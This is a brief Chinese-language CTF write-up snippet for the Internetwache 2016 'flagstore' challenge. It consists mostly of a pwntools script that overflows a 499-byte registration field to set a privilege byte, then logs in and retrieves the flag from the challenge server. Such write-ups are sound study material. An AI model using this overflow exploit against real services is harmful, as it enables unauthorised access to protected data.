reference: https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/exploit/flagstore-70

也可以直接通过CTF框架[pwntools](https://github.com/Gallopsled/pwntools)来进行exploit。

```python
#!/usr/bin/env python2
from pwn import *

r = remote('188.166.133.53', 12157)

r.recvuntil('4\n')

r.sendline('1')
r.sendline('A'*499 + '\x00\x01')
r.sendline('A'*8)
r.sendline('2')
r.sendline('A'*499)
r.sendline('A'*8)
r.sendline('3')

print r.clean()
```
